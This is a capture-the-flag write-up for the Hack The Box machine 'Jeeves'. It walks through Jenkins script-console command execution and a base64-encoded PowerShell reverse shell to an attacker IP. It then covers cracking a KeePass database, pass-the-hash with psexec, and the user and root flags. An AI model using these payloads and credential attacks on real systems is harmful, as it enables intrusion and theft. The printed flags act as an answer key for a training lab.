+++
title = "HTB - Jeeves"
date = 2024-12-15
+++

### Scan
```
map -sV -sC -p- --open 10.10.10.63
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 12:04 EST
Nmap scan report for 10.10.10.63
Host is up (0.16s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
| smb2-time: 
|   date: 2024-12-11T22:08:49
|_  start_date: 2024-12-11T22:04:18

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 295.54 seconds
```

### Enumeration
80:
	AskJeeves Instance. Stale. IIS pretty up-to-date
135:
	No RPC Null Authentication
445:
	No SMB Null Authentication
50000:
	Default page returns error, but `/askjeeves`instance paired with `Jetty 9.4.z-SNAPSHOT`
	We can abuse our access to gain a shell by creating a job or using the script console. Manage > ScriptConsole
	`println "cmd.exe /c whoami".execute().text`. We an use this as a POC
	Now, create a shell. Start a listener and execute for callback:
```
println("powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==".execute().text)
```
USER:`e3232272596fb47950d59c4cf1e7066a`

### Privilege Escalation
Once we're on as `kohsuke`, we find a keypass database in `Documents` called `CEH.kdbx`
We can move this to the `\Users\Administrator\.jenkins\workspace\li0t` directory, and download from our linux machine.
First, go to the main dashboard, create a new object, name it `li0t`, and build the project with the panel on the left.
Navigate to the workspace folder on the website, and download the file.
Create a hash to break: `keepass2john CEH.kdbx > key.hash`
Break it: `john --wordlist=/usr/share/wordlists/rockyou.txt key.hash`. Password is `moonshine1`
Install `kpcli` to interact with KeyPass databases. `kcli --kdb CEH.kdbx`, then `find .` to show all.
We find 8 different entries, and the one that differs is the `Backup`, containing a hash.
We can pass with `psexec.py`: 
`python3 psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' administrator@10.10.10.63 cmd.exe`
Hidden flag. Prank file instead. Suggests looking deeper.
To view alternate data streams, we can use `dir /R`. Then, we use `more < hm.txt:root.txt` for our flag.
ROOT:`afbc5bd4b615a60648cec41c6ac92530`



